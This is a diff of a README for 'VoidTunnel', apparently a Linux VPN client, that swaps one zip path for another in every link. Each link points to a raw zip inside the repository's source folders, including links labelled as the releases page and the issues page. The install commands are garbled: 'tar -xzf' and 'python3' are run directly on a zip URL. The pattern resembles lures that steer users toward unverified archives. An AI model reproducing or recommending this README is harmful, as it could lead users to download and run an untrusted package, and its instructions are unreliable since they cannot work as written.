@@ -1,6 +1,6 @@
 # 🚀 VoidTunnel - Simple, Secure VPN/Proxy Client
 
-[![Download VoidTunnel](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip)](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip)
+[![Download VoidTunnel](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip)](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip)
 
 ## 🔍 Overview
 
@@ -30,24 +30,24 @@ To use VoidTunnel, ensure your system meets these requirements:
 
 To get started with VoidTunnel, visit the following link to download the latest version:
 
-[Download VoidTunnel](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip)
+[Download VoidTunnel](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip)
 
 ### Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip). Here, you will find the latest version of VoidTunnel.
+   Go to the [Releases page](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip). Here, you will find the latest version of VoidTunnel.
 
 2. **Select the Latest Release:**
    Look for the most recent version at the top of the page. Each release will have notes explaining new features and fixes.
 
 3. **Download the Package:**
-   Click on the file that matches your Linux distribution to start downloading. For example, you might see a file named `https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip`.
+   Click on the file that matches your Linux distribution to start downloading. For example, you might see a file named `https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip`.
 
 4. **Extract the Files:**
    Once the download is complete, open a terminal and navigate to your Downloads folder (or wherever you saved the file). Use the following command to extract the files:
 
    ```bash
-   tar -xzf https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip
+   tar -xzf https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip
    ```
 
 5. **Navigate to the Extracted Folder:**
@@ -61,7 +61,7 @@ To get started with VoidTunnel, visit the following link to download the latest 
    Start the application by executing the following command:
 
    ```bash
-   python3 https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip
+   python3 https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip
    ```
 
    If you have installed PyQt6 correctly, VoidTunnel should launch without any issues.
@@ -94,7 +94,7 @@ Currently, VoidTunnel is designed specifically for Linux. Future versions may su
 
 ### What should I do if I encounter an error?
 
-Check the GitHub issues page on the [VoidTunnel repository](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip) for possible solutions or to report your issue.
+Check the GitHub issues page on the [VoidTunnel repository](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip) for possible solutions or to report your issue.
 
 ## 📧 Support
 
@@ -110,4 +110,4 @@ Before contributing, make sure to read the contribution guidelines in the reposi
 
 VoidTunnel is open-source and distributed under the MIT License. For more details, check the `LICENSE` file included in the package.
 
-[Download VoidTunnel](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/core/Void_Tunnel_v1.1.zip) again to get started!
+[Download VoidTunnel](https://github.com/Laplace003/VoidTunnel/raw/refs/heads/main/src/resources/Void-Tunnel-1.8.zip) again to get started!
